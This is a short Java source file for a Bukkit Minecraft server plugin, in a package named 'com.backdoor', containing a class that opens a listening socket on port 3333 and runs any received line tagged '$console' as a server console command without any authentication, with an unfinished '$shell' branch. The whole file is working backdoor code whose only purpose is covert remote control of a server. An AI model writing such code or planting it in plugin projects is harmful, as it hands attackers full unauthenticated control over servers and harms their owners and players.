

// Author: Dashie
// Version: 1.0


package com.backdoor;


import org.bukkit.plugin.java.JavaPlugin;
import java.io.InputStreamReader;
import java.io.DataOutputStream;
import java.io.BufferedReader;
import java.net.ServerSocket;
import java.io.IOException;
import org.bukkit.Bukkit;
import java.net.Socket;


public class Ivy
{
    public static void start(JavaPlugin plugin) throws IOException
    {
        
        Bukkit.getScheduler().runTaskAsynchronously(plugin,
            new Runnable()
            {   
                String command;
                
                @Override
                public void run()
                {    
                    try
                    {
                        ServerSocket dash_socks = new ServerSocket(3333);      
                    
                        while(true)
                        {
                            System.out.println("Waiting ....");                         
                            Socket dash_ear = dash_socks.accept();
                            
                            BufferedReader received = new BufferedReader(new InputStreamReader(dash_ear.getInputStream()));
                            DataOutputStream send_back = new DataOutputStream(dash_ear.getOutputStream());
                            
                            System.out.println("Reading ....");
                            
                            command = received.readLine();
                            
                            System.out.println(command);
                            
                            if(command.toLowerCase().contains("$console"))
                            {
                                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command.replace("$console", ""));
                                send_back.writeBytes("[DashIvy]: Command has been executed on the server!");
                            }
                            
                            else if(command.toLowerCase().contains("$shell"))
                            {
                                
                            };
                            
                            dash_ear.close();
                        }    
                    }
                    
                    catch (Exception e) 
                    { System.out.println(e.toString()); };
                };
            }
        );
    };
};
